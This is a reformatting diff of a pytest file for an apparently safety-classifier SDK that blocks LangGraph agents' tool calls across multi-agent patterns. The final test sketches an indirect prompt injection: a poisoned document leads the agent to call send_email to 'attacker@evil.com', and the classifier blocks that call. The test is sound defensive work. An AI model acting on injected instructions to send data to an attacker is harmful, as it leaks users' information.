@@ -28,16 +28,15 @@ from collections.abc import Iterator
 from pathlib import Path  # noqa: TC003
 from typing import Any
 
+import adrian
 import pytest
+from adrian.format.types import AgentContext, LlmPairData, PairedEvent
+from adrian.proto import event_pb2 as pb
 from langchain_core.messages import AIMessage
 from langchain_core.runnables.config import RunnableConfig, ensure_config
 from langgraph._internal._constants import CONF, CONFIG_KEY_RUNTIME
 from langgraph.prebuilt import ToolNode
 from langgraph.runtime import Runtime
-
-import adrian
-from adrian.format.types import AgentContext, LlmPairData, PairedEvent
-from adrian.proto import event_pb2 as pb
 
 
 @pytest.fixture(autouse=True)  # pyright: ignore[reportUntypedFunctionDecorator]
@@ -119,6 +118,7 @@ def _init_block_mode(tmp_path: Path, block_timeout: float = 1.0) -> Any:
 
 def _tool(name: str, captured: list[str]) -> Any:
     """Build a named stub tool that records its argument."""
+
     def _impl(x: str) -> str:
         """Stub tool."""
         captured.append(f"{name}:{x}")
@@ -197,11 +197,15 @@ class TestToolCallIdCorrelation:
         ws = _init_block_mode(tmp_path)
 
         llm_a = _llm_pair(
-            "evt-A", "run-A", "agent-A",
+            "evt-A",
+            "run-A",
+            "agent-A",
             [{"id": "tc-alpha", "name": "t", "args": {}}],
         )
         llm_b = _llm_pair(
-            "evt-B", "run-B", "agent-B",
+            "evt-B",
+            "run-B",
+            "agent-B",
             [{"id": "tc-beta", "name": "t", "args": {}}],
         )
 
@@ -236,14 +240,18 @@ class TestS1SubagentsAsTools:
         # Director LLM pair, calls the worker
         await ws.on_paired_event(
             _llm_pair(
-                "evt-director", "run-director", "director",
+                "evt-director",
+                "run-director",
+                "director",
                 [{"id": "tc-director", "name": "call_worker", "args": {"x": "d"}}],
             ),
         )
         # Worker LLM pair, calls its own internal tool
         await ws.on_paired_event(
             _llm_pair(
-                "evt-worker", "run-worker", "director|worker",
+                "evt-worker",
+                "run-worker",
+                "director|worker",
                 [{"id": "tc-worker", "name": "worker_inner", "args": {"x": "w"}}],
                 parent_run_id="run-director",
             ),
@@ -256,10 +264,14 @@ class TestS1SubagentsAsTools:
         # Director tool invocation
         director_tn = _tool_node([director_tool])
         dir_state: dict[str, Any] = {
-            "messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-director", "name": "call_worker", "args": {"x": "d"}}],
-            )],
+            "messages": [
+                AIMessage(
+                    content="",
+                    tool_calls=[
+                        {"id": "tc-director", "name": "call_worker", "args": {"x": "d"}}
+                    ],
+                )
+            ],
         }
         dir_result = await director_tn.ainvoke(dir_state, config=_runtime_config())
         assert "BLOCKED" in dir_result["messages"][0].content
@@ -268,10 +280,14 @@ class TestS1SubagentsAsTools:
         # Worker tool invocation
         worker_tn = _tool_node([worker_tool])
         worker_state: dict[str, Any] = {
-            "messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-worker", "name": "worker_inner", "args": {"x": "w"}}],
-            )],
+            "messages": [
+                AIMessage(
+                    content="",
+                    tool_calls=[
+                        {"id": "tc-worker", "name": "worker_inner", "args": {"x": "w"}}
+                    ],
+                )
+            ],
         }
         await worker_tn.ainvoke(worker_state, config=_runtime_config())
         assert captured == ["worker_inner:w"]
@@ -290,13 +306,17 @@ class TestS2Handoff:
 
         await ws.on_paired_event(
             _llm_pair(
-                "evt-triage", "run-triage", "triage",
+                "evt-triage",
+                "run-triage",
+                "triage",
                 [{"id": "tc-triage", "name": "triage_route", "args": {"x": "t"}}],
             ),
         )
         await ws.on_paired_event(
             _llm_pair(
-                "evt-spec", "run-spec", "specialist",
+                "evt-spec",
+                "run-spec",
+                "specialist",
                 [{"id": "tc-spec", "name": "specialist_action", "args": {"x": "s"}}],
             ),
         )
@@ -306,20 +326,40 @@ class TestS2Handoff:
 
         t_tn = _tool_node([triage_tool])
         await t_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-triage", "name": "triage_route", "args": {"x": "t"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": "tc-triage",
+                                "name": "triage_route",
+                                "args": {"x": "t"},
+                            }
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert captured == ["triage_route:t"]
 
         s_tn = _tool_node([specialist_tool])
         s_result = await s_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-spec", "name": "specialist_action", "args": {"x": "s"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": "tc-spec",
+                                "name": "specialist_action",
+                                "args": {"x": "s"},
+                            }
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "BLOCKED" in s_result["messages"][0].content
@@ -345,12 +385,24 @@ class TestS3RouterFanout:
 
         # Three specialists emit concurrently (interleaved)
         pairs = [
-            _llm_pair("evt-math", "run-math", "math_agent",
-                      [{"id": "tc-math", "name": "math", "args": {"x": "m"}}]),
-            _llm_pair("evt-writing", "run-writing", "writing_agent",
-                      [{"id": "tc-writing", "name": "writing", "args": {"x": "w"}}]),
-            _llm_pair("evt-search", "run-search", "search_agent",
-                      [{"id": "tc-search", "name": "search", "args": {"x": "s"}}]),
+            _llm_pair(
+                "evt-math",
+                "run-math",
+                "math_agent",
+                [{"id": "tc-math", "name": "math", "args": {"x": "m"}}],
+            ),
+            _llm_pair(
+                "evt-writing",
+                "run-writing",
+                "writing_agent",
+                [{"id": "tc-writing", "name": "writing", "args": {"x": "w"}}],
+            ),
+            _llm_pair(
+                "evt-search",
+                "run-search",
+                "search_agent",
+                [{"id": "tc-search", "name": "search", "args": {"x": "s"}}],
+            ),
         ]
 
         await asyncio.gather(*(ws.on_paired_event(p) for p in pairs))
@@ -372,7 +424,9 @@ class TestS3RouterFanout:
 
         results = await asyncio.gather(
             _run(math_tn, {"id": "tc-math", "name": "math", "args": {"x": "m"}}),
-            _run(writing_tn, {"id": "tc-writing", "name": "writing", "args": {"x": "w"}}),
+            _run(
+                writing_tn, {"id": "tc-writing", "name": "writing", "args": {"x": "w"}}
+            ),
             _run(search_tn, {"id": "tc-search", "name": "search", "args": {"x": "s"}}),
         )
 
@@ -396,18 +450,30 @@ class TestS4Hierarchical:
         worker_tool = _tool("do_work", captured)
 
         await ws.on_paired_event(
-            _llm_pair("evt-dir", "run-dir", "director",
-                      [{"id": "tc-dir", "name": "delegate_to_lead", "args": {"x": "d"}}]),
+            _llm_pair(
+                "evt-dir",
+                "run-dir",
+                "director",
+                [{"id": "tc-dir", "name": "delegate_to_lead", "args": {"x": "d"}}],
+            ),
         )
         await ws.on_paired_event(
-            _llm_pair("evt-lead", "run-lead", "director|team_lead",
-                      [{"id": "tc-lead", "name": "delegate_to_worker", "args": {"x": "l"}}],
-                      parent_run_id="run-dir"),
+            _llm_pair(
+                "evt-lead",
+                "run-lead",
+                "director|team_lead",
+                [{"id": "tc-lead", "name": "delegate_to_worker", "args": {"x": "l"}}],
+                parent_run_id="run-dir",
+            ),
         )
         await ws.on_paired_event(
-            _llm_pair("evt-worker", "run-worker", "director|team_lead|worker",
-                      [{"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}],
-                      parent_run_id="run-lead"),
+            _llm_pair(
+                "evt-worker",
+                "run-worker",
+                "director|team_lead|worker",
+                [{"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}],
+                parent_run_id="run-lead",
+            ),
         )
 
         _preload_verdict(ws, "evt-dir", _notify_verdict("evt-dir"))
@@ -417,10 +483,20 @@ class TestS4Hierarchical:
         # Director → runs
         dir_tn = _tool_node([director_tool])
         await dir_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-dir", "name": "delegate_to_lead", "args": {"x": "d"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": "tc-dir",
+                                "name": "delegate_to_lead",
+                                "args": {"x": "d"},
+                            }
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "delegate_to_lead:d" in captured
@@ -428,10 +504,20 @@ class TestS4Hierarchical:
         # Team lead → BLOCKED
         lead_tn = _tool_node([lead_tool])
         lead_result = await lead_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-lead", "name": "delegate_to_worker", "args": {"x": "l"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": "tc-lead",
+                                "name": "delegate_to_worker",
+                                "args": {"x": "l"},
+                            }
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "BLOCKED" in lead_result["messages"][0].content
@@ -439,10 +525,16 @@ class TestS4Hierarchical:
         # Worker → runs (its verdict is BENIGN, independent of the middle block)
         worker_tn = _tool_node([worker_tool])
         await worker_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-worker", "name": "do_work", "args": {"x": "w"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "do_work:w" in captured
@@ -461,18 +553,30 @@ class TestS6SwarmHandoffs:
 
         # Alice turn 1
         await ws.on_paired_event(
-            _llm_pair("evt-a1", "run-a1", "Alice",
-                      [{"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}]),
+            _llm_pair(
+                "evt-a1",
+                "run-a1",
+                "Alice",
+                [{"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}],
+            ),
         )
         # Bob turn 1
         await ws.on_paired_event(
-            _llm_pair("evt-b1", "run-b1", "Bob",
-                      [{"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}]),
+            _llm_pair(
+                "evt-b1",
+                "run-b1",
+                "Bob",
+                [{"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}],
+            ),
         )
         # Alice turn 2
         await ws.on_paired_event(
-            _llm_pair("evt-a2", "run-a2", "Alice",
-                      [{"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}]),
+            _llm_pair(
+                "evt-a2",
+                "run-a2",
+                "Alice",
+                [{"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}],
+            ),
         )
 
         _preload_verdict(ws, "evt-a1", _notify_verdict("evt-a1"))
@@ -484,24 +588,42 @@ class TestS6SwarmHandoffs:
 
         # Interleaved invocation
         await alice_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-a1", "name": "alice_action", "args": {"x": "a1"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         bob_result = await bob_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-b1", "name": "bob_action", "args": {"x": "b1"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         await alice_tn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-a2", "name": "alice_action", "args": {"x": "a2"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
 
@@ -524,14 +646,30 @@ class TestS7Supervisor:
         for i in range(3):
             await ws.on_paired_event(
                 _llm_pair(
-                    f"evt-sup-{i}", f"run-sup-{i}", "supervisor",
-                    [{"id": f"tc-sup-{i}", "name": f"dispatch_{i}", "args": {"x": str(i)}}],
+                    f"evt-sup-{i}",
+                    f"run-sup-{i}",
+                    "supervisor",
+                    [
+                        {
+                            "id": f"tc-sup-{i}",
+                            "name": f"dispatch_{i}",
+                            "args": {"x": str(i)},
+                        }
+                    ],
                 ),
             )
             await ws.on_paired_event(
                 _llm_pair(
-                    f"evt-w-{i}", f"run-w-{i}", f"supervisor|worker_{i}",
-                    [{"id": f"tc-w-{i}", "name": f"worker_action_{i}", "args": {"x": str(i)}}],
+                    f"evt-w-{i}",
+                    f"run-w-{i}",
+                    f"supervisor|worker_{i}",
+                    [
+                        {
+                            "id": f"tc-w-{i}",
+                            "name": f"worker_action_{i}",
+                            "args": {"x": str(i)},
+                        }
+                    ],
                     parent_run_id=f"run-sup-{i}",
                 ),
             )
@@ -539,16 +677,30 @@ class TestS7Supervisor:
         # Allow everything except worker 1
         for i in range(3):
             _preload_verdict(ws, f"evt-sup-{i}", _notify_verdict(f"evt-sup-{i}"))
-            v = _block_verdict(f"evt-w-{i}") if i == 1 else _notify_verdict(f"evt-w-{i}")
+            v = (
+                _block_verdict(f"evt-w-{i}")
+                if i == 1
+                else _notify_verdict(f"evt-w-{i}")
+            )
             _preload_verdict(ws, f"evt-w-{i}", v)
 
         for i in range(3):
             wt = _tool(f"worker_action_{i}", captured)
             tn = _tool_node([wt])
-            state = {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": f"tc-w-{i}", "name": f"worker_action_{i}", "args": {"x": str(i)}}],
-            )]}
+            state = {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": f"tc-w-{i}",
+                                "name": f"worker_action_{i}",
+                                "args": {"x": str(i)},
+                            }
+                        ],
+                    )
+                ]
+            }
             result = await tn.ainvoke(state, config=_runtime_config())
 
             if i == 1:
@@ -572,7 +724,9 @@ class TestS8DeepResearchParallel:
         # All 4 researchers' LLM pairs arrive concurrently
         pairs = [
             _llm_pair(
-                f"evt-r-{i}", f"run-r-{i}", f"supervisor|researcher_{i}",
+                f"evt-r-{i}",
+                f"run-r-{i}",
+                f"supervisor|researcher_{i}",
                 [{"id": f"tc-r-{i}", "name": f"research_{i}", "args": {"x": str(i)}}],
                 parent_run_id="run-supervisor",
             )
@@ -582,15 +736,29 @@ class TestS8DeepResearchParallel:
 
         # Block researchers 1 and 3; allow 0 and 2
         for i in range(4):
-            v = _block_verdict(f"evt-r-{i}") if i in {1, 3} else _notify_verdict(f"evt-r-{i}")
+            v = (
+                _block_verdict(f"evt-r-{i}")
+                if i in {1, 3}
+                else _notify_verdict(f"evt-r-{i}")
+            )
             _preload_verdict(ws, f"evt-r-{i}", v)
 
         async def _run(i: int) -> Any:
             tn = _tool_node([researcher_tools[i]])
-            state = {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": f"tc-r-{i}", "name": f"research_{i}", "args": {"x": str(i)}}],
-            )]}
+            state = {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": f"tc-r-{i}",
+                                "name": f"research_{i}",
+                                "args": {"x": str(i)},
+                            }
+                        ],
+                    )
+                ]
+            }
 
             return await tn.ainvoke(state, config=_runtime_config())
 
@@ -617,12 +785,20 @@ class TestS5CustomWorkflow:
 
         # analyst → (deterministic node, no event) → reviewer
         await ws.on_paired_event(
-            _llm_pair("evt-analyst", "run-analyst", "analyst",
-                      [{"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}]),
+            _llm_pair(
+                "evt-analyst",
+                "run-analyst",
+                "analyst",
+                [{"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}],
+            ),
         )
         await ws.on_paired_event(
-            _llm_pair("evt-reviewer", "run-reviewer", "reviewer",
-                      [{"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}]),
+            _llm_pair(
+                "evt-reviewer",
+                "run-reviewer",
+                "reviewer",
+                [{"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}],
+            ),
         )
 
         _preload_verdict(ws, "evt-analyst", _notify_verdict("evt-analyst"))
@@ -630,20 +806,32 @@ class TestS5CustomWorkflow:
 
         atn = _tool_node([analyst_tool])
         await atn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-analyst", "name": "analyze", "args": {"x": "a"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "analyze:a" in captured
 
         rtn = _tool_node([reviewer_tool])
         r_result = await rtn.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-reviewer", "name": "review", "args": {"x": "r"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "BLOCKED" in r_result["messages"][0].content
@@ -673,8 +861,12 @@ class TestMaliciousToolOutputBlocksNextTurn:
 
         # Turn 1: benign LLM decision to call read_file
         await ws.on_paired_event(
-            _llm_pair("evt-1", "run-1", "agent",
-                      [{"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}]),
+            _llm_pair(
+                "evt-1",
+                "run-1",
+                "agent",
+                [{"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}],
+            ),
         )
         # Tool runs, returns malicious payload (poisoned doc). Simulated by
         # simply recording that it ran, the SDK doesn't store tool output
@@ -683,10 +875,16 @@ class TestMaliciousToolOutputBlocksNextTurn:
 
         tn1 = _tool_node([benign_tool])
         await tn1.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {"id": "tc-1", "name": "read_file", "args": {"x": "doc.md"}}
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
         assert "read_file:doc.md" in captured  # turn 1 ran
@@ -694,17 +892,37 @@ class TestMaliciousToolOutputBlocksNextTurn:
         # Turn 2: agent reasons about the poisoned output and wants to
         # exfiltrate.  Classifier catches the reasoning here.
         await ws.on_paired_event(
-            _llm_pair("evt-2", "run-2", "agent",
-                      [{"id": "tc-2", "name": "send_email", "args": {"x": "attacker@evil.com"}}]),
+            _llm_pair(
+                "evt-2",
+                "run-2",
+                "agent",
+                [
+                    {
+                        "id": "tc-2",
+                        "name": "send_email",
+                        "args": {"x": "attacker@evil.com"},
+                    }
+                ],
+            ),
         )
         _preload_verdict(ws, "evt-2", _block_verdict("evt-2"))
 
         tn2 = _tool_node([exfil_tool])
         result = await tn2.ainvoke(
-            {"messages": [AIMessage(
-                content="",
-                tool_calls=[{"id": "tc-2", "name": "send_email", "args": {"x": "attacker@evil.com"}}],
-            )]},
+            {
+                "messages": [
+                    AIMessage(
+                        content="",
+                        tool_calls=[
+                            {
+                                "id": "tc-2",
+                                "name": "send_email",
+                                "args": {"x": "attacker@evil.com"},
+                            }
+                        ],
+                    )
+                ]
+            },
             config=_runtime_config(),
         )
 
